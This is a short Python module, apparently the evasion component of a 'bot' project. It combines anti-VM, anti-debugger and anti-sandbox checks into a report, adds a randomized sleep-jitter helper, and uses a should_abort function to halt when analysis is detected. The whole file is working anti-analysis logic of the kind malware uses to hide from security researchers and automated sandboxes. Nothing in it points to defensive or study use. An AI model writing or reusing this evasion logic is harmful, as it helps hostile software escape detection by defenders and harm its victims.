"""bot/evasion.py — aggregate lab checks + jitter"""
import random
import time
from typing import Dict

from bot.anti_vm import detect as vm_detect
from bot.anti_debug import detect as debug_detect
from bot.anti_sandbox import detect as sandbox_detect


def check_vm() -> bool:
    return vm_detect().get("is_vm", False)


def check_debug() -> bool:
    return debug_detect().get("is_debugged", False)


def check_sandbox() -> bool:
    return sandbox_detect().get("is_sandbox", False)


def full_report() -> Dict:
    return {
        "vm": vm_detect(),
        "debug": debug_detect(),
        "sandbox": sandbox_detect(),
    }


def sleep_jitter(base: float = 1.0, spread: float = 0.5):
    time.sleep(max(0.0, base + random.uniform(-spread, spread)))


def should_abort(abort_on_vm: bool = False, abort_on_debug: bool = True, abort_on_sandbox: bool = False) -> bool:
    if abort_on_debug and check_debug():
        return True
    if abort_on_vm and check_vm():
        return True
    if abort_on_sandbox and check_sandbox():
        return True
    return False
